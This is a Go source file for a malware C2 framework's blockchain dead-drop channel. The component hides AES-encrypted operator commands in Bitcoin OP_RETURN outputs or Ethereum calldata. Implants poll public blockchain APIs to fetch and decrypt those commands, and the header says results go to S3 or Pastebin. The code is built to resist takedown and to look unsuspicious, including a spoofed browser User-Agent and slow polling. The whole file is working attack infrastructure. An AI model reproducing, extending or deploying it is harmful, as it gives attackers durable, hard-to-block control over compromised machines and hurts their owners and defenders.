package blockchain

/*
	SUDOSOC-C2 — Blockchain Dead-Drop C2
	Copyright (C) 2026  sudosoc — Seif

	Uses Bitcoin/Ethereum blockchain as an immutable, uncensorable
	command channel. Commands are embedded in transactions and can
	never be deleted.

	Why it's uncensorable:
	  • No server to take down
	  • No domain to seize
	  • Commands persist forever in the blockchain
	  • Read-only access requires no account or authentication

	Bitcoin OP_RETURN:
	  Bitcoin allows 80 bytes of arbitrary data per transaction
	  via the OP_RETURN opcode.
	  We embed: [4B magic][4B session][4B seq][encrypted payload]

	Ethereum:
	  Transaction input data field: unlimited size.
	  We embed commands in the calldata of a transaction to
	  a watched address.

	Protocol:
	  Operator broadcasts a Bitcoin/ETH transaction containing
	  the encrypted command.
	  Implant polls the blockchain API (Blockstream/Infura) for
	  transactions matching the session address.
	  Implant decrypts and executes.
	  Results are written to a secondary dead-drop (S3/Pastebin).
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

const (
	// Magic bytes to identify SUDOSOC C2 transactions
	btcMagic = uint32(0x5DC20C2)

	// API endpoints (no API key needed for basic queries)
	blockstreamAPI = "https://blockstream.info/api"
	etherscanAPI   = "https://api.etherscan.io/api"
	infuraURL      = "https://mainnet.infura.io/v3"

	// Polling interval (longer = less suspicious)
	defaultPollInterval = 5 * time.Minute
)

// BlockchainC2 manages C2 via blockchain dead-drop
type BlockchainC2 struct {
	Chain        Chain
	WatchAddress string   // Bitcoin/ETH address to watch for commands
	SessionID    uint32
	AESKey       []byte
	LastHeight   int64    // last processed block height
	httpClient   *http.Client
	InfuraKey    string   // optional, for ETH
}

// Chain represents the blockchain type
type Chain int

const (
	Bitcoin  Chain = iota
	Ethereum Chain = iota
)

// NewBlockchainC2 creates a new blockchain C2 channel
func NewBlockchainC2(chain Chain, watchAddr string, sessionID uint32, aesKey []byte) *BlockchainC2 {
	return &BlockchainC2{
		Chain:        chain,
		WatchAddress: watchAddr,
		SessionID:    sessionID,
		AESKey:       aesKey,
		httpClient:   &http.Client{Timeout: 30 * time.Second},
	}
}

// ── Bitcoin C2 ────────────────────────────────────────────────────

// PollBitcoin checks for new commands embedded in OP_RETURN outputs
// of transactions to the watched address.
func (b *BlockchainC2) PollBitcoin() ([][]byte, error) {
	txs, err := b.getBitcoinTransactions()
	if err != nil {
		return nil, err
	}

	var commands [][]byte
	for _, tx := range txs {
		for _, out := range tx.Vout {
			if out.ScriptPubKey.Type != "op_return" {
				continue
			}
			data, err := hex.DecodeString(out.ScriptPubKey.Hex)
			if err != nil || len(data) < 6 {
				continue
			}
			// OP_RETURN script: 0x6A <pushdata> <data>
			// Find the actual data after OP_RETURN opcode
			payload := extractOpReturn(data)
			if payload == nil || len(payload) < 12 {
				continue
			}

			// Validate magic + session
			if binary.BigEndian.Uint32(payload[0:4]) != btcMagic {
				continue
			}
			if binary.BigEndian.Uint32(payload[4:8]) != b.SessionID {
				continue
			}

			// Decrypt the command payload
			encrypted := payload[8:]
			cmd, err := b.decrypt(encrypted)
			if err != nil {
				continue
			}
			commands = append(commands, cmd)
		}
	}
	return commands, nil
}

func (b *BlockchainC2) getBitcoinTransactions() ([]BTCTransaction, error) {
	url := fmt.Sprintf("%s/address/%s/txs", blockstreamAPI, b.WatchAddress)
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := b.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var txs []BTCTransaction
	json.NewDecoder(resp.Body).Decode(&txs)
	return txs, nil
}

// EncodeCommand encodes an encrypted command for Bitcoin OP_RETURN
// Returns the hex-encoded script that can be used in a transaction
func (b *BlockchainC2) EncodeCommand(command []byte) (string, error) {
	encrypted, err := b.encrypt(command)
	if err != nil {
		return "", err
	}

	if len(encrypted) > 68 { // 4+4+60 max for OP_RETURN
		return "", fmt.Errorf("command too large for OP_RETURN (%d > 68 bytes)", len(encrypted))
	}

	payload := make([]byte, 8+len(encrypted))
	binary.BigEndian.PutUint32(payload[0:4], btcMagic)
	binary.BigEndian.PutUint32(payload[4:8], b.SessionID)
	copy(payload[8:], encrypted)

	// Build OP_RETURN script
	script := []byte{0x6A} // OP_RETURN
	if len(payload) <= 75 {
		script = append(script, byte(len(payload)))
	} else {
		script = append(script, 0x4C, byte(len(payload))) // OP_PUSHDATA1
	}
	script = append(script, payload...)

	return hex.EncodeToString(script), nil
}

// ── Ethereum C2 ───────────────────────────────────────────────────

// PollEthereum checks for commands in calldata of incoming ETH transactions
func (b *BlockchainC2) PollEthereum(etherscanKey string) ([][]byte, error) {
	url := fmt.Sprintf("%s?module=account&action=txlist&address=%s&sort=desc&apikey=%s",
		etherscanAPI, b.WatchAddress, etherscanKey)

	resp, err := b.httpClient.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var result struct {
		Result []ETHTx `json:"result"`
	}
	json.NewDecoder(resp.Body).Decode(&result)

	var commands [][]byte
	for _, tx := range result.Result {
		if tx.Input == "" || tx.Input == "0x" {
			continue
		}
		data, err := hex.DecodeString(strings.TrimPrefix(tx.Input, "0x"))
		if err != nil || len(data) < 12 {
			continue
		}
		if binary.BigEndian.Uint32(data[0:4]) != btcMagic {
			continue
		}
		if binary.BigEndian.Uint32(data[4:8]) != b.SessionID {
			continue
		}
		cmd, err := b.decrypt(data[8:])
		if err != nil {
			continue
		}
		commands = append(commands, cmd)
	}
	return commands, nil
}

// GetCurrentBlockHeight returns the latest block height
func (b *BlockchainC2) GetCurrentBlockHeight() (int64, error) {
	var url string
	switch b.Chain {
	case Bitcoin:
		url = blockstreamAPI + "/blocks/tip/height"
	default:
		return 0, fmt.Errorf("unsupported chain")
	}

	resp, err := b.httpClient.Get(url)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var height int64
	fmt.Sscanf(string(body), "%d", &height)
	return height, nil
}

// ── Helpers ──────────────────────────────────────────────────────

func extractOpReturn(script []byte) []byte {
	if len(script) < 2 || script[0] != 0x6A {
		return nil
	}
	offset := 1
	if script[1] == 0x4C && len(script) > 2 { // OP_PUSHDATA1
		offset = 3
	} else if script[1] <= 75 {
		offset = 2
	}
	if offset >= len(script) {
		return nil
	}
	return script[offset:]
}

func (b *BlockchainC2) encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(b.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (b *BlockchainC2) decrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(b.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(data) < ns {
		return nil, fmt.Errorf("too short")
	}
	return gcm.Open(nil, data[:ns], data[ns:], nil)
}

// ── API types ──────────────────────────────────────────────────────

type BTCTransaction struct {
	Txid string   `json:"txid"`
	Vout []BTCOut `json:"vout"`
}

type BTCOut struct {
	Value        float64      `json:"value"`
	ScriptPubKey BTCScript    `json:"scriptpubkey"`
}

type BTCScript struct {
	Type string `json:"scriptpubkey_type"`
	Hex  string `json:"scriptpubkey"`
}

type ETHTx struct {
	Hash  string `json:"hash"`
	Input string `json:"input"`
	Value string `json:"value"`
}
